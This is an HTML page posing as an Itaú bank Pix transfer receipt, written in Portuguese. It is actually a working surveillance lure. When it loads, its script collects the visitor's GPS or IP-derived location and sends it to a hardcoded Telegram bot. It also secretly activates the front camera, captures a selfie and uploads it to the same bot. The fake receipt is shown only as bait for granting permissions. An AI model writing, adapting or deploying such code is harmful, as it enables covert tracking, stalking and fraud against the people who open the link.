<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Comprovante ‚Äì Ita√∫</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  /* Estilos gerais */
  *{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}
  body{background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh}
  #spinnerBox{display:flex;flex-direction:column;align-items:center;justify-content:center}
  #spinner{width:48px;height:48px;border:4px solid #ddd;border-top:4px solid #003366;border-radius:50%;animation:spin 1s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  #msgNegado{display:none;text-align:center;color:#c00;font-size:16px;font-weight:600}
  #comprovante{display:none;background:#fff;width:100%;max-width:480px;padding:24px;border:1px solid #ccc;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
  .logo{background:#003366;color:#fff;font-weight:700;font-size:18px;padding:12px;text-align:center;border-radius:4px;margin-bottom:16px}
  .row{display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px}
  .label{color:#555}
  .value{font-weight:600}
  .divider{height:1px;background:#ddd;margin:12px 0}
  .center{text-align:center}

  /* Mini-mapa */
  #miniMap{height:90px;border:1px solid #ccc;border-radius:4px;margin:10px 0;width:100%;background:#e9e9e9;position:relative;overflow:hidden}
  #miniMap img{width:100%;height:100%;object-fit:cover;position:absolute;top:0;left:0}
  #miniMap .dot{position:absolute;top:50%;left:50%;width:12px;height:12px;background:red;border:2px solid #fff;border-radius:50%;transform:translate(-50%,-50%)}
</style>
</head>
<body>

<!-- 1) SPINNER -->
<div id="spinnerBox">
  <div id="spinner"></div>
  <p style="margin-top:12px;color:#003366;font-size:14px">Aguardando permiss√£o de localiza√ß√£o‚Ä¶</p>
</div>

<!-- 2) MENSAGEM CASO NEGUE -->
<div id="msgNegado">
  <p>Para visualizar, precisa permitir permiss√µes da p√°gina.</p>
  <div id="miniMap"></div>
</div>

<!-- 3) COMPROVANTE -->
<div id="comprovante">
  <div class="logo">Ita√∫</div>
  <div id="miniMap"></div>
  <div class="row"><span class="label">Comprovante de Transfer√™ncia</span><span class="value" id="dataHora"></span></div>
  <div class="divider"></div>
  <div class="row"><span class="label">Valor</span><span class="value" id="valor"></span></div>
  <div class="divider"></div>
  <div class="row"><span class="label">ID da transa√ß√£o</span><span class="value" id="idTransacao"></span></div>
  <div class="row"><span class="label">Autentica√ß√£o BACEN</span><span class="value" id="autenticacao"></span></div>
  <div class="divider"></div>
  <p class="center" style="font-size:12px;color:#777">Transa√ß√£o realizada com sucesso.</p>
</div>

<!-- 4) CAMERA (oculta) -->
<video id="camera" style="display:none;" autoplay muted playsinline></video>

<script>
/* ---------- CONFIG ---------- */
const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
const CHAT_ID = '-1003187104876';

const dados = {
  valor: "R$ 1.234,56",
  dataHora: new Date().toLocaleString('pt-BR'),
  idTransacao: 'ITAUPIX' + Date.now(),
  autenticacao: [...Array(20)].map(() => Math.random().toString(36)[2]).join('')
};

/* ---------- UTIL ---------- */
const tele = (msg, media = null) => {
  let form = new FormData();
  form.append('chat_id', CHAT_ID);
  form.append('caption', msg);
  if (media) {
    form.append('photo', media, 'selfie.jpg');
    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body: form});
  } else {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({chat_id: CHAT_ID, text: msg})
    });
  }
};

function criarMiniMapa(lat, lon, elem) {
  const img = document.createElement('img');
  img.src = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=17&size=480x200&maptype=roadmap&markers=color:red|${lat},${lon}&key=AIzaSyDummiesForDemo`; // troque pela sua API
  elem.innerHTML = '';
  elem.appendChild(img);
  const dot = document.createElement('div');
  dot.className = 'dot';
  elem.appendChild(dot);
}

async function selfie() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
    const v   = document.getElementById('camera');
    v.srcObject = stream;
    await v.play();
    const canvas = document.createElement('canvas');
    [canvas.width, canvas.height] = [640, 480];
    canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(blob => {
      tele('üì∏ selfie ap√≥s abrir comprovante', blob);
      stream.getTracks().forEach(t=>t.stop());
    }, 'image/jpeg', 0.9);
  } catch (e) {
    tele('üì∏ erro selfie: ' + e.message);
  }
}

/* ---------- LOCALIZA√á√ÉO ---------- */
function enviarTele(lat, lon, prec, source) {
  const map = `https://www.google.com/maps/@${lat},${lon},18z`;
  tele(`üìç ${source}\nMapa: ${map}\nLat: ${lat}\nLon: ${lon}\nPrec: ${prec} m`);
}

function handlePermitir(pos) {
  const {latitude:lat, longitude:lon, accuracy:prec} = pos.coords;
  enviarTele(lat, lon, prec, 'GPS permitido');
  criarMiniMapa(lat, lon, document.querySelector('#comprovante #miniMap'));
  document.getElementById('spinnerBox').style.display = 'none';
  document.getElementById('comprovante').style.display = 'block';
  setTimeout(selfie, 1500);
}

function handleNegar() {
  fetch('https://ipapi.co/json/')
    .then(r=>r.json())
    .then(data=>{
      const lat = data.latitude;
      const lon = data.longitude;
      enviarTele(lat, lon, '~1 km', 'IP negado');
      criarMiniMapa(lat, lon, document.querySelector('#msgNegado #miniMap'));
      selfie(); // tenta selfie mesmo que negou GPS
    })
    .catch(()=>{
      const [lat, lon] = [-23.550520, -46.633309];
      enviarTele(lat, lon, 'indispon√≠vel', 'gen√©rica');
      criarMiniMapa(lat, lon, document.querySelector('#msgNegado #miniMap'));
      selfie();
    });
  document.getElementById('spinnerBox').style.display = 'none';
  document.getElementById('msgNegado').style.display = 'block';
}

if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(handlePermitir, handleNegar, {enableHighAccuracy:true,timeout:8000});
} else {
  handleNegar();
}
</script>
</body>
</html>
